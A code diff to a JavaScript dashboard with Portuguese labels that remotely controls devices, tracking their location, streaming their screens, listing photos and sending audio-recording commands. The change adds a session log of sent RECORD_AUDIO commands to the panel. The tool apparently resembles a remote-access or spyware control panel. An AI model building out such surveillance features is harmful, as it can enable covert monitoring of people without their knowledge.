@@ -3,12 +3,13 @@ let socket = null;
 let map = null;
 let deviceMarker = null;
 let deviceAccuracyCircle = null;
-let trailPolylines = []; // Array of day-segment polylines for 30-day trail
-let dayMarkers = [];    // Markers at day boundaries on the trail
+let trailPolylines = [];
+let dayMarkers = [];
 let currentDeviceId = null;
 let devicesMap = new Map();
 let isScreenStreaming = false;
 let currentStreamObjectUrl = null;
+let sentAudioLog = []; // in-memory list of RECORD_AUDIO commands sent this session
 
 // Premium custom cyber-dark theme styling for Google Maps (neon style matching our dashboard)
 const darkMapStyle = [
@@ -645,10 +646,46 @@ function fetchMediaList(deviceId) {
         .then(data => {
             renderPhotos(deviceId, data.photos || []);
             renderAudios(deviceId, data.audio || []);
+            renderSentAudios(deviceId);
         })
-        .catch(err => {
-            console.error('Error fetching media list:', err);
-        });
+        .catch(err => console.error('Error fetching media list:', err));
+}
+
+// Render sent audio commands for current device
+function renderSentAudios(deviceId) {
+    const list = document.getElementById('audio-sent-list');
+    if (!list) return;
+    const entries = sentAudioLog.filter(e => e.deviceId === deviceId);
+    if (entries.length === 0) {
+        list.innerHTML = '<div class="empty-audio-msg">Nenhum comando enviado ainda.</div>';
+        return;
+    }
+    list.innerHTML = '';
+    // Show newest first
+    [...entries].reverse().forEach(e => appendSentAudio(e, false));
+}
+
+function appendSentAudio(entry, prepend = true) {
+    const list = document.getElementById('audio-sent-list');
+    if (!list) return;
+    const empty = list.querySelector('.empty-audio-msg');
+    if (empty) empty.remove();
+
+    const time = new Date(entry.ts).toLocaleTimeString('pt-BR') + ' ' + new Date(entry.ts).toLocaleDateString('pt-BR');
+    const div = document.createElement('div');
+    div.className = 'audio-item audio-sent';
+    div.innerHTML = `
+        <div class="audio-info">
+            <i class="fa-solid fa-paper-plane"></i>
+            <div class="audio-meta">
+                <span class="audio-name">Comando de Gravação (${entry.duration}s)</span>
+                <span class="audio-time">${time}</span>
+            </div>
+        </div>
+        <span class="audio-sent-badge">ENVIADO</span>
+    `;
+    if (prepend && list.firstChild) list.insertBefore(div, list.firstChild);
+    else list.appendChild(div);
 }
 
 // Render photo gallery
@@ -740,22 +777,25 @@ function sendCommand(command, params = {}) {
         logToConsole('Nenhum dispositivo selecionado!', 'error');
         return;
     }
-    
+
     const device = devicesMap.get(currentDeviceId);
     if (device && !device.isOnline) {
         logToConsole(`Comando '${command}' falhou: Dispositivo está OFFLINE!`, 'error');
         return;
     }
-    
-    const payload = {
-        command: command,
-        deviceId: currentDeviceId,
-        ...params
-    };
-    
+
+    const payload = { command, deviceId: currentDeviceId, ...params };
+
     if (socket && socket.readyState === WebSocket.OPEN) {
         socket.send(JSON.stringify(payload));
         logToConsole(`Comando enviado: ${command} (${JSON.stringify(params)})`, 'command');
+
+        // Track sent audio commands to display in audio panel
+        if (command === 'RECORD_AUDIO') {
+            const entry = { ts: Date.now(), duration: params.duration || 15, deviceId: currentDeviceId };
+            sentAudioLog.push(entry);
+            if (currentDeviceId === entry.deviceId) appendSentAudio(entry);
+        }
     } else {
         logToConsole('Erro: Sem conexão com o servidor!', 'error');
     }
